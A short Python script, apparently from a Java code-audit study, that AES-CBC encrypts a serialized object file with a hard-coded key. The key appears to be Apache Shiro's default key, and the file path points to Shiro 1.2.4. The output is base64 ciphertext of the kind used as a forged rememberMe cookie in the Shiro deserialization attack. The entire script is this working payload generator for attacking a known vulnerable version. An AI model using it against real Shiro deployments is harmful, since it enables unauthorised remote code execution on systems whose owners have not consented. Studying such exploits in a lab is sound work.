from ast import Lambda
import base64
from email.mime import base
from random import Random
import uuid
from Crypto.Cipher import AES

def get_file_data(filename):
    with open(filename,'rb') as f:
        data=f.read()
        #print(data)
    return data

def shiro_enc(data):
    BS = AES.block_size
    pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS).encode()
    #pad = lambda s: s + ((BS - len(s) % BS)*chr(BS -len(s) % BS)).encode()
    key="kPH+bIxk5D2deZiIxcaaaA=="
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key),mode,iv)
    ciphertext = base64.b64encode(iv  + encryptor.encrypt(pad(data)))
    return ciphertext

if __name__ == '__main__':
    data = get_file_data("C:/Users/17140/Desktop/暑假实习/java代码审计/shiro-shiro-root-1.2.4/script/ser.bin")
    print(shiro_enc(data)) 
    